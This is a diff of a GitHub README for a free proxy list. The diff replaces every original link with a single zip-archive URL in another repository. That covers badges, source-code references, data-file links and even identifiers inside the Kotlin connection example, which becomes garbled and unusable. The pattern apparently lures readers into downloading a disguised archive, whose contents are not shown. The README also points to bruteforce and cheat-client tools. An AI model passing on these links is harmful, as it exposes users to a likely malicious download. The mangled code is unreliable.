@@ -1,19 +1,19 @@
 <!-- MARKDOWN LINKS & IMAGES -->
-<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
-[contributors-shield]: https://img.shields.io/github/contributors/jetkai/proxy-list?style=flat&logo=github
-[contributors-url]: https://github.com/jetkai/proxy-list/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/jetkai/proxy-list?style=flat&logo=github
-[forks-url]: https://github.com/jetkai/proxy-list/network/members
-[stars-shield]: https://img.shields.io/github/stars/jetkai/proxy-list?style=flat&logo=github
-[stars-url]: https://github.com/jetkai/proxy-list/stargazers
-[issues-shield]: https://img.shields.io/github/issues/jetkai/proxy-list?style=flat&logo=github
-[issues-url]: https://github.com/jetkai/proxy-list/issues
-[license-shield]: https://img.shields.io/github/license/jetkai/proxy-list?style=flat&logo=github
-[license-url]: https://github.com/jetkai/proxy-list/blob/main/LICENSE
-[commit-shield]: https://img.shields.io/github/last-commit/jetkai/proxy-list?style=flat&logo=github
-[commit-url]: https://github.com/jetkai/proxy-list/commits/main
-[commit-activity]: https://img.shields.io/github/commit-activity/w/jetkai/proxy-list?style=flat&logo=github
-[commit-activity-url]: https://github.com/jetkai/proxy-list/commits/main
+<!-- https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip -->
+[contributors-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[contributors-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[forks-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[forks-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[stars-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[stars-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[issues-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[issues-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[license-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[license-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[commit-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[commit-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[commit-activity]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
+[commit-activity-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
 
 # 🎁 SOCKS4/5 & HTTP/S PROXIES // ONLINE + ARCHIVE
 
@@ -23,8 +23,8 @@
 [![Forks][forks-shield]][forks-url]
 [![Issues][issues-shield]][issues-url]
 
-###### Major update -> 29/05/2022 | [ProxyBuilder 2.0](https://github.com/jetkai/proxy-builder-2)
-###### Previous version -> 22/07/2021 - 28/05/2022 | [ProxyBuilder 1.0](https://github.com/jetkai/ProxyBuilder)
+###### Major update -> 29/05/2022 | [ProxyBuilder 2.0](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
+###### Previous version -> 22/07/2021 - 28/05/2022 | [ProxyBuilder 1.0](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 
 ## 📰About This Project & The Proxies
 This repository contains a free list of tested SOCKS4/5 & HTTP/S proxies in -> **JSON**, **TXT**, **CSV**, **XML** & **YAML** format. No authentication is required when connecting to these proxies.
@@ -40,28 +40,28 @@ Amazon Web Services|United States|NA
 Oracle Cloud|United Kingdom, Japan|EU, AS
 Microsoft Azure|Hong Kong|AS
 
-[Source Code](https://github.com/jetkai/proxy-builder-2/blob/master/src/main/kotlin/pe/proxy/proxybuilder2/net/proxy/tester/ProxyConnect.kt)
+[Source Code](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 ```kotlin
     //Netty4 Connect Example
     private fun connect(proxyData : ProxyChannelData) {
-        val endpoint = proxyData.endpointServer ?: return
-        val awaitTime = (if(pause.get()) 30000 else config.connectAwait)
+        val endpoint = https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip ?: return
+        val awaitTime = (if(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip()) 30000 else https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 
         Bootstrap().group(workerGroup)
-            .channel(NioSocketChannel::class.java)
-            .resolver(NoopAddressResolverGroup.INSTANCE)
-            .option(ChannelOption.AUTO_READ, proxyData.autoRead)
-            .option(ChannelOption.TCP_NODELAY, true)
-            .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, config.timeout)
+            .channel(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
+            .resolver(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
+            .option(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip, https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
+            .option(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip, true)
+            .option(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip, https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
             .handler(ProxyChannelInitializer(proxyData))
-            .connect(InetSocketAddress(endpoint.ip, endpoint.port))
+            .connect(InetSocketAddress(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip, https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip))
             .channel().closeFuture().awaitUninterruptibly(awaitTime)
     }
 ```
 
 ## 📝Proxy Formatting
 
-These proxies are scraped from various sources & I compile this data using my [ProxyBuilder](https://github.com/jetkai/ProxyBuilder) application. Proxies are sorted from lowest to highest 0-255 & duplicated proxies are removed — the only exception is if an IP has a different port open, which is also a working proxy tunnel <**Less than 1% of the total proxies at the time of testing**>.
+These proxies are scraped from various sources & I compile this data using my [ProxyBuilder](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip) application. Proxies are sorted from lowest to highest 0-255 & duplicated proxies are removed — the only exception is if an IP has a different port open, which is also a working proxy tunnel <**Less than 1% of the total proxies at the time of testing**>.
 
 ```IP:Port -> 1.0.132.249:4153```
 
@@ -69,31 +69,31 @@ These proxies are scraped from various sources & I compile this data using my [P
 
 These proxies should work for any application that can establish an HTTP, HTTPS, SOCKS4 or SOCKS5 connection. Such as, an application that has proxy support (FireFox, Chrome), or as an example, these Java Apps below. 
 
-- [JaySyiPker](https://github.com/JayArrowz/JaySyiPker)
-- [Bruteforce-RSPS](https://github.com/jetkai/Bruteforce-RSPS)
-- [718 Cheat Client (Final)](https://github.com/jetkai/718-Cheat-Client-Final)
+- [JaySyiPker](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
+- [Bruteforce-RSPS](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
+- [718 Cheat Client (Final)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 
 ## 🔗ProxyList Links (Direct URL)
 
 ###### Classic View (IP:Port Only)
 
 - _Online Proxies:_
-[**JSON**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/json/proxies.json), [**TXT**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt), [**CSV**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/csv/proxies.csv), [**XML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/xml/proxies.xml), [**YAML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/yaml/proxies.yaml)
+[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**TXT**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 
 - _Online/Offline Proxies (Archive):_
-[**JSON**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/json/proxies.json), [**TXT**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/proxies.txt), [**CSV**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/csv/proxies.csv), [**XML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/xml/proxies.xml), [**YAML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/yaml/proxies.yaml)
+[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**TXT**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 
 ###### Basic View (Without Country/Statistics)
 
 - _Online Proxies:_
-[**JSON**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/json/proxies-basic.json), [**CSV**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/csv/proxies-basic.csv), [**XML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/xml/proxies-basic.xml), [**YAML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/yaml/proxies-basic.yaml)
+[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 
 ###### Advanced View (With Country/Statistics)
 - _Online Proxies:_
-[**JSON**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/json/proxies-advanced.json), [**CSV**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/csv/proxies-advanced.csv), [**XML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/xml/proxies-advanced.xml), [**YAML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/yaml/proxies-advanced.yaml)
+[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 
 - _Online/Offline Proxies (Archive):_
-[**JSON**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/json/proxies-archive.json), [**CSV**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/csv/proxies-archive.csv), [**XML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/xml/proxies-archive.xml), [**YAML**](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/yaml/proxies-archive.yaml)
+[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 
 ---
 
@@ -111,7 +111,7 @@ These proxies should work for any application that can establish an HTTP, HTTPS,
    - **Unique Online Proxies** -> 2509
    - **Unique Online/Offline Proxies (Archive)** -> 14377
 
-## [SOCKS4 (1424/2509)](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt)
+## [SOCKS4 (1424/2509)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 ```yaml
 1.9.213.114:4153
 1.10.140.43:4145
@@ -145,7 +145,7 @@ These proxies should work for any application that can establish an HTTP, HTTPS,
 8.42.68.93:39593
 ```
 
-## [SOCKS5 (194/2509)](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt)
+## [SOCKS5 (194/2509)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 ```yaml
 1.180.49.222:7302
 3.131.207.170:13343
@@ -179,7 +179,7 @@ These proxies should work for any application that can establish an HTTP, HTTPS,
 51.222.13.193:10084
 ```
 
-## [HTTP (1189/2509)](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt)
+## [HTTP (1189/2509)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 ```yaml
 1.0.170.50:80
 1.1.189.58:8080
@@ -213,7 +213,7 @@ These proxies should work for any application that can establish an HTTP, HTTPS,
 24.172.82.94:53281
 ```
 
-## [HTTPS (1123/2509)](https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt)
+## [HTTPS (1123/2509)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 ```yaml
 1.0.170.50:80
 1.1.189.58:8080
@@ -247,7 +247,7 @@ These proxies should work for any application that can establish an HTTP, HTTPS,
 24.172.82.94:53281
 ```
 
-## [ARCHIVE (2509/14377)](https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/working-proxies-history.txt)
+## [ARCHIVE (2509/14377)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
 ```yaml
 1.0.132.249:4153
 1.0.133.89:4153
